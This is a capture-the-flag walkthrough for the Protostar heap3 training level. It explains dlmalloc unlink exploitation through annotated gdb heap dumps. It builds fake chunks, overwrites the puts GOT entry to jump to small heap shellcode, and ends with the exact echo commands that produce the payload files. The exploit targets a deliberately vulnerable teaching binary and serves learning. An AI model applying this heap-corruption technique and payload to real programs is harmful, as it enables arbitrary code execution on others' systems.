## HEAP 3 ##
This level introduces the Doug Lea Malloc (dlmalloc) and how heap meta data can be modified to change program execution.

This level is at /opt/protostar/bin/heap3

### Source Code ###
```C
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

void winner()
{
  printf("that wasn't too bad now, was it? @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  char *a, *b, *c;

  a = malloc(32);
  b = malloc(32);
  c = malloc(32);

  strcpy(a, argv[1]);
  strcpy(b, argv[2]);
  strcpy(c, argv[3]);

  free(c);
  free(b);
  free(a);

  printf("dynamite failed?\n");
}
```
In order to do tackle this challenge, we really need to understand how dlmalloc
work. First of all, to grasp the basic understanding, I need to go through the
following references:
+ Understanding heap glibc implementation
[Part1][https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/]
and [Part2][https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/]
+ The Heap: Once Upon a Free (LiveOverflow)
[Part1][https://www.youtube.com/watch?v=gL45bjQvZSU&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=30]
[Part2][https://www.youtube.com/watch?v=HWhzH--89UQ&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=31]
+ Once Upon A Free [Paper][http://phrack.org/issues/57/9.html]

First of all, let's give the program some inputs and look at the heap.
```
gdb /opt/protostar/bin/heap3

r AAAA BBBB CCCC

Continuing.
---------------------------------HEAP---------------------------------------------
0x804c000:      0x00000000      0x00000029      0x41414141      0x00000000
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x42424242      0x00000000      0x00000000      0x00000000
0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000029      0x43434343      0x00000000
0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0a0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0b0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0c0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0d0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0e0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0f0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c100:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c110:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c120:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c130:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c140:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c150:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c160:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c170:      0x00000000      0x00000000      0x00000000      0x00000000
---------------------------------EIP----------------------------------------------
0x8048911 <main+136>:   call   0x8049824 <free>
0x8048916 <main+141>:   mov    0x18(%esp),%eax
```
As you can see, the heap contains our input data. Now let's free them.
```
---------------------------------HEAP---------------------------------------------
0x804c000:      0x00000000      0x00000029      0x0804c028      0x00000000
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x0804c050      0x00000000      0x00000000      0x00000000
0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000029      0x00000000      0x00000000
0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0a0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0b0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0c0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0d0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0e0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0f0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c100:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c110:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c120:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c130:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c140:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c150:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c160:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c170:      0x00000000      0x00000000      0x00000000      0x00000000
---------------------------------EIP----------------------------------------------
```
You can see that the change at 0x804c30 and 0x804c008. They contain the address
of the next free chunk. As we may understand from the references above, these
chunks are too small, and they belong to the fast bins. In this case, there is
no consolidation occurring. 
As we go through LiveOverflow's guidance, we need to aim at the *free* function,
especially the part that triggers the consolidation of bins. That means, we need
to have bins that belong to the small-bin type. In this case, it must be larger
than 80 bytes. Therefore, we can choose 100 bytes or 0x00000064. However, we
choose 0x00000065 in order to notify the heap manager that the previous chunk is
in use. This value should be set at 0x804c054. 
Now, in order to trigger the consolidation process from the heap manager, we
need to create two faked chunks after the third one. The faked chunks should
have the P bit set to 0 to activate the consolidation process. 
```
---------------------------------HEAP----------------------------------------
0x804c000:      0x00000000      0x00000029      0x41414141      0x42424242
               ----------------------------
0x804c010:     |0x048864b8      0x00d0ff08|      0x00000000      0x00000000  <-Shell code
                ---------------------------
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x41414141      0x42424242      0x43434343      0x44444444
0x804c040:      0x45454545      0x46464646      0x47474747      0x48484848
                              --------------
0x804c050:      0x49494949    | 0x00000065 |    0x4c4c4c4c      0x4c4c4c4c <- size to 100 bytes, previous chunk is in use
                              --------------
0x804c060:      0x4c4c4c4c      0x4c4c4c4c      0x4c4c4c4c      0x4c4c4c4c
0x804c070:      0x4c4c4c4c      0x4c4c4c4c      0x4c4c4c4c      0x4c4c4c4c
0x804c080:      0x4c4c4c4c      0x4c4c4c4c      0x4c4c4c4c      0x4c4c4c4c
0x804c090:      0x4c4c4c4c      0x4c4c4c4c      0x4c4c4c4c      0x4c4c4c4c
0x804c0a0:      0x4c4c4c4c      0x4c4c4c4c      0x4c4c4c4c      0x4c4c4c4c
                             ------------------------------------------------
0x804c0b0:      0x4c4c4c4c   |  0xfffffffc      0xfffffffc      0x0804b11c  |
             ----------------                                               | <- Fourth and "Fifth" chunk
0x804c0c0:   |  0x0804c010      0x00000000      0x00000000      0x00000000  |
0x804c0d0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0e0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0f0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c100:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c110:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c120:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c130:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c140:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c150:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c160:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c170:      0x00000000      0x00000000      0x00000000      0x00000000
```
In order to overcome the NULL character problem (\x00), there is a brilliant
idea from the Once Upon a Free paper. We can put 0xfffffffc at the size of the 
fourth chunk (at 0x804cb8). When the next chunk address is calculated, the size 
it is actually deduced by 4. That means, the "fifth" chunk starts at 0x804cb4. 
If we put the same value 0xfffffffc, it will indicate that the fourth chunk is 
not in use. Therefore the forward consolidation process will be activated to
consolidate the third and the fourth chunk. 
Then, we need to overwrite the GOT endtry of puts@plt with an address that can 
call the *winner* function. First of all, let's specify the GOT address at 
0x804c0bc. Notice that the GOT address written here  must be - 12 bytes because 
FD->bk means +12 bytes from address of FD or 0x0804b11c. The next word should be 
a heap address containing the shellcode calling the winner. We point it to 
0x804c010.
```
---------------------------------HEAP---------------------------------------------
0x804c000:      0x00000000      0x00000029      0x0804c028      0x42424242
                                               -------------
0x804c010:      0x048864b8      0x00d0ff08     |0x0804b11c|      0x00000000   <- BK->fd is written because of forward consolidation
                                               -----------
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x00000000      0x42424242      0x43434343      0x44444444
0x804c040:      0x45454545      0x46464646      0x47474747      0x48484848
0x804c050:      0x49494949      0x00000061      0x0804b194      0x0804b194
0x804c060:      0x4c4c4c4c      0x4c4c4c4c      0x4c4c4c4c      0x4c4c4c4c
0x804c070:      0x4c4c4c4c      0x4c4c4c4c      0x4c4c4c4c      0x4c4c4c4c
0x804c080:      0x4c4c4c4c      0x4c4c4c4c      0x4c4c4c4c      0x4c4c4c4c
0x804c090:      0x4c4c4c4c      0x4c4c4c4c      0x4c4c4c4c      0x4c4c4c4c
0x804c0a0:      0x4c4c4c4c      0x4c4c4c4c      0x4c4c4c4c      0x4c4c4c4c
0x804c0b0:      0x00000060      0xfffffffc      0xfffffffc      0x0804b11c
0x804c0c0:      0x0804c010      0x00000000      0x00000000      0x00000000
0x804c0d0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0e0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0f0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c100:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c110:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c120:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c130:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c140:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c150:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c160:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c170:      0x00000000      0x00000000      0x00000000      0x00000000
---------------------------------EIP----------------------------------------------
0x8048935 <main+172>:   call   0x8048790 <puts@plt>

0x804893a <main+177>:   leave  
----------------------------------------------------------------------------------

Breakpoint 11, 0x08048935 in main (argc=4, argv=0xbffff7c4) at heap3/heap3.c:28
28      in heap3/heap3.c
(gdb) c
Continuing.
that wasn't too bad now, was it? @ 1628619010     <---- Here we go

Program received signal SIGSEGV, Segmentation fault.
---------------------------------HEAP---------------------------------------------
0x804c000:      0x00000000      0x00000029      0x0804c028      0x42424242
0x804c010:      0x048864b8      0x00d0ff08      0x0804b11c      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x00000000      0x42424242      0x43434343      0x44444444
0x804c040:      0x45454545      0x46464646      0x47474747      0x48484848
0x804c050:      0x49494949      0x00000061      0x0804b194      0x0804b194
0x804c060:      0x4c4c4c4c      0x4c4c4c4c      0x4c4c4c4c      0x4c4c4c4c
0x804c070:      0x4c4c4c4c      0x4c4c4c4c      0x4c4c4c4c      0x4c4c4c4c
0x804c080:      0x4c4c4c4c      0x4c4c4c4c      0x4c4c4c4c      0x4c4c4c4c
0x804c090:      0x4c4c4c4c      0x4c4c4c4c      0x4c4c4c4c      0x4c4c4c4c
0x804c0a0:      0x4c4c4c4c      0x4c4c4c4c      0x4c4c4c4c      0x4c4c4c4c
0x804c0b0:      0x00000060      0xfffffffc      0xfffffffc      0x0804b11c
0x804c0c0:      0x0804c010      0x00000000      0x00000000      0x00000000
0x804c0d0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0e0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0f0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c100:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c110:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c120:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c130:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c140:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c150:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c160:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c170:      0x00000000      0x00000000      0x00000000      0x00000000
---------------------------------EIP----------------------------------------------
0x804c017:      add    %bl,(%ecx,%esi,4)

0x804c01a:      add    $0x8,%al
----------------------------------------------------------------------------------
0x0804c017 in ?? ()
(gdb) c
Continuing.

Dump of assembler code for function puts@plt:
0x08048790 <puts@plt+0>:        jmp    *0x804b128
0x08048796 <puts@plt+6>:        push   $0x68
0x0804879b <puts@plt+11>:       jmp    0x80486b0
End of assembler dump.
(gdb) x/wx 0x804b128
0x804b128 <_GLOBAL_OFFSET_TABLE_+64>:   0x0804c010    <- The GOT entry is
overwritten with the heap address containing our shell code
```
Now we can run without gdb
```
echo -en "AAAABBBB\xB8\x64\x88\x04\x08\xFF\xD0" > A.txt
echo -ne "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII\x65\x00\x00\x00" > B.txt
echo -ne "LLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLL
LLLLLLLLLLLLLLLLLLLLLLL\xfc\xff\xff\xff\xfc\xff\xff\xff\x1c\xb1\x04\x08\x10\xc0
\x04\x08" > C.txt

/opt/protostar/bin/heap3 `cat /home/user/A.txt` `cat /home/user/B.txt` `cat
/home/user/C.txt`
```



